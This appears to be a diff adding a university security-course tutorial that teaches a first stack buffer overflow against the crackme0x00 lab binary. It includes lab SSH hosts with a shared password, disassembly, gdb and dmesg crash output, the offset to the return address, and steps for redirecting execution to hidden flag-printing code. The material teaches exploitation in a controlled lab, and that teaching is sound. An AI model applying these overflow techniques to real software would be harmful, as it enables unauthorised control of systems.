@@ -1,0 +1,155 @@
+=================================
+Lec03: Writing Your First Exploit
+=================================
+
+Do you remember the crackme binaries (and their password)?
+
+  $ ssh lab03@cyclonus.gtisc.gatech.edu -p 9003
+  $ ssh lab03@computron.gtisc.gatech.edu -p 9003
+  Password: lab03
+
+  $ cd tut03-stackovfl
+  $ ./crackme0x00
+  IOLI Crackme Level 0x00
+  Password:
+
+If you disassemble the binary (it's good time to fire IDA!), you
+will see these code snippet:
+
+  $ objdump -M intel-mnemonic -d crackme0x00
+
+  ...
+  80486c6:       8d 45 e8                lea    eax,[ebp-0x18]
+  80486c9:       50                      push   eax
+  80486ca:       68 31 88 04 08          push   0x8048831
+  80486cf:       e8 ac fd ff ff          call   8048480 <scanf@plt>
+  ...
+
+
+What's the value of 0x8048831? Yes, "%s", which means the scanf() function
+gets a string as an argument on -0x18(%ebp) location.
+
+What happens if you inject a long string? Like below.
+
+  $ echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA | ./crackme0x00
+  IOLI Crackme Level 0x00
+  Password: Invalid Password!
+  Segmentation fault
+
+There are a few ways to check the status of the last segmentation
+fault:
+
+  ** /tmp/input should be your secret file under /tmp!
+
+  1) running gdb
+
+    $ echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA > /tmp/input
+    $ gdb ./crackme0x00
+    > run </tmp/input
+    Starting program: ./crackme0x00 </tmp/input
+    IOLI Crackme Level 0x00
+    Password: Invalid Password!
+
+    Program received signal SIGSEGV, Segmentation fault.
+    0x41414141 in ?? ()
+
+  2) checking logging messages (if you are working on your local machine)
+
+    $ dmesg | tail -1
+    [237413.117757] crackme0x00[353]: segfault at 41414141 ip 0000000041414141 sp 00000000ff92aef0
+    error 14 in libc-2.24.so[f7578000+1b3000]
+
+    * NOTE: We disable dmesg for the class.
+            You will be able to run dmesg on your local environment.
+
+Let's figure out which input tainted the instruction pointer.
+
+    $ echo AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJ > /tmp/input
+    $ ./crackme0x00 < /tmp/input
+    $ dmesg | tail -1
+    [238584.915883] crackme0x00[1095]: segfault at 48484848 ip 0000000048484848 sp 00000000ffc32f80
+    error 14 in libc-2.24.s
+
+What's the current instruction pointer? You might need this help:
+
+    $ man ascii
+
+You can also figure out the exact shape of the stack frame by looking at
+the instructions as well.
+
+  $ objdump -M intel-mnemonic -d crackme0x00
+  ...
+  0804869d <start>:
+  804869d:       55                      push   ebp
+  804869e:       89 e5                   mov    ebp,esp
+  80486a0:       83 ec 18                sub    esp,0x18
+  80486a3:       83 ec 0c                sub    esp,0xc
+  ...
+  80486c6:       8d 45 e8                lea    eax,[ebp-0x18]
+  80486c9:       50                      push   eax
+  80486ca:       68 31 88 04 08          push   0x8048831
+  80486cf:       e8 ac fd ff ff          call   8048480 <scanf@plt>
+  ...
+
+             |<-- -0x18-->|+--- ebp
+  top                     v
+  [          [buf ..  ]   ][fp][ra]
+  |<----  0x18+0xc ------>|
+
+  0x18 + 4 = 28, which is exactly the length of "AAAABBBBCCCCDDDDEEEEFFFFGGGG".
+  The following "HHHH" will cover the [ra] (i.e., the return address).
+
+In this tutorial, we are going to hijack the control flow of ./crackme0x00
+by overwriting the instruction pointer. As a first step, let's make it print
+out "Password OK :)" without putting the correct password!
+
+   80486e3:       e8 38 fd ff ff          call   8048420 <strcmp@plt>
+   80486e8:       83 c4 10                add    esp,0x10
+   80486eb:       85 c0                   test   eax,eax
+   80486ed:       75 3a                   jne    8048729 <start+0x8c>
+   80486ef:       83 ec 0c                sub    esp,0xc
+-> 80486f2:       68 5e 88 04 08          push   0x804885e
+   80486f7:       e8 74 fd ff ff          call   8048470 <puts@plt>
+   ...
+   804872c:       68 92 88 04 08          push   0x8048892
+   8048731:       e8 3a fd ff ff          call   8048470 <puts@plt>
+   8048736:       83 c4 10                add    esp,0x10
+
+
+We are going to jump to 0x80486f2 such that it calls puts() with an argument
+0x804885e, and prints out "Password OK :)".
+Which characters of the input should be changed to 0x80486f2? Let me remind you
+that x86 is a little-endian machine.
+
+   $ hexedit /tmp/input
+
+"C-x" will save your modification.
+
+   $ cat /tmp/input | ./crackme0x00
+   IOLI Crackme Level 0x00
+   Password: Invalid Password!
+   Password OK :)
+   Segmentation fault
+
+Today's task is to modify a python template for exploitation. Please
+edit the provided python script (exploit.py) to hijack the control
+flow of crackme0x00! Most importantly, please hijack the control flow
+to print out your flag by jumping to this "unreachable" code of the binary.
+
+   // If you want to get the flag without hijacking the control flow,
+   // your input should be "250381" and "no way you can reach!" at the
+   // same time! Is that possible?
+
+   8048702:       68 6d 88 04 08          push   0x804886d
+   8048707:       8d 45 e8                lea    eax,[ebp-0x18]
+   804870a:       50                      push   eax
+   804870b:       e8 10 fd ff ff          call   8048420 <strcmp@plt>
+   8048710:       83 c4 10                add    esp,0x10
+   8048713:       85 c0                   test   eax,eax
+   8048715:       75 22                   jne    8048739 <start+0x9c>
+   8048717:       83 ec 0c                sub    esp,0xc
+-> 804871a:       68 83 88 04 08          push   0x8048883
+   804871f:       e8 b7 fe ff ff          call   80485db <print_key>
+
+If you'd like to practice more, can you make the exploit to gracefully
+exit the program after hijacking its control multiple times?
